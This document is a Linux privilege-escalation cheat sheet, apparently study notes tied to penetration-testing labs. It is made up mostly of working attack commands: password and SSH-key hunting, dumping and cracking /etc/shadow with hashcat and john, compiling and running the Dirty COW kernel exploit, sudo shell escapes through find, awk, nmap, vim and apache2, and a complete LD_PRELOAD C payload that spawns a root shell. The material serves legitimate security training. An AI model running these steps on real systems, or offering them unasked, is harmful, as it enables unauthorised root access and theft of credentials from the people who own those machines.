# Linux Privilege Escalation

<details>
 <summary>Resources</summary>

[Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

[Linux Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

[Checklist - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)

[Sushant 747's Guide](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html)

[Linux PrivEsc Lab](https://tryhackme.com/room/linuxprivescarena)

</details>
 
## Initial Enumeration

<details>
 <summary>System Enumeration</summary>

```
hostname
```
```
uname -a
```
```
cat /proc/version
```
```
cat /etc/issue
```
```
lscpu
```
```
ps aux
```
</details>

<details>
 <summary>User Enumeration</summary>

```
whoami
```
```
id
```
```
sudo -l
```
```
cat /etc/passwd
cat /etc/passwd |cut -d : -f 1
```
```
cat /etc/shadow
```
```
cat /etc/group
```
```
history
```
</details>

<details>
 <summary>Network Enumeration</summary>

```
ifconfig
ip a
```
```
route
ip route
```
```
arp -a
ip neigh
```
```
netstat -ano
```
</details>

<details>
 <summary>Password Hunting</summary>

```
grep --color=auto -rnm '/' -ie "PASSWORD" --color=always 2> /dev/null
```
```
locate password | more
locate passw | more
```
```
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2>
 /dev/null
```
</details>

## Automated Tools

[LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

[LinEnum](https://github.com/rebootuser/LinEnum)

[Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)

[Linux Priv Checker](https://github.com/sleventyeleven/linuxprivchecker)

## Escalation Path: Kernel Exploits

[Kernel Exploits](https://github.com/lucyoa/kernel-exploits)

[DirtyCow](https://github.com/dirtycow/dirtycow.github.io)

Victim:

```
gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w
./c0w
passwd
id
```

## Escalation Path: Passwords and File Permissions

```
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
```

### Stored Passwords (Config Files)

Victim:

```
cat /home/user/myvpn.ovpn
```

- From the output, make note of the value of the “auth-user-pass” directive.

```
cat /etc/openvpn/auth.txt
```

- From the output, make note of the clear-text credentials.

```
cat /home/user/.irssi/config | grep -i passw
```

- From the output, make note of the clear-text credentials.

### Stored Passwords (History)

Victim:

```
history | grep pass
cat ~/.bash_history | grep -i passw
```

- From the output, make note of the clear-text credentials.

### Weak File Permissions

Victim:

```
ls -la /etc/passwd
ls -la /etc/shadow
```

- Note the file permissions

```
cat /etc/passwd
```

- Save the output to a file on your attacker machine

```
cat /etc/shadow
```

- Save the output to a file on your attacker machine

Kali:

```
unshadow <PASSWORD-FILE> <SHADOW-FILE> > unshadowed.txt
```

```
hashcat -m 1800 unshadowed.txt rockyou.txt -O
```

### SSH Keys

Victim:

```
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
```

- Note the results.
- Copy the contents of the discovered id_rsa file to a file on your attacker VM.

Kali:

```
chmod 400 id_rsa
ssh -i id_rsa root@<ip>
```

## Escalation Path: Sudo

```
sudo -l
```

- From the output, notice the list of programs that can run via sudo.

### Escalation via Sudo Shell Escaping

[GTFOBins](https://gtfobins.github.io/)
[Linux PrivEsc Playground](https://tryhackme.com/room/privescplayground)

```
sudo find /bin -name nano -exec /bin/sh \;
sudo awk 'BEGIN {system("/bin/sh")}'
echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
sudo vim -c '!sh'
```

### Escalation via Intended Functionality

[wget example](https://veteransec.com/2018/09/29/hack-the-box-sunday-walkthrough/)

Victim:

```
sudo apache2 -f /etc/shadow
```

Attacker:

```
echo '[Pasted Root Hash]' > hash.txt
john --wordlist=/usr/share/wordlists/nmap.lst hash.txt
```

- From the output, notice the cracked credentials.

### Escalation via LD_PRELOAD

- Open Text Editor

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
- Save the file as x.c

```
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
sudo LD_PRELOAD=/tmp/x.so apache2
id
```
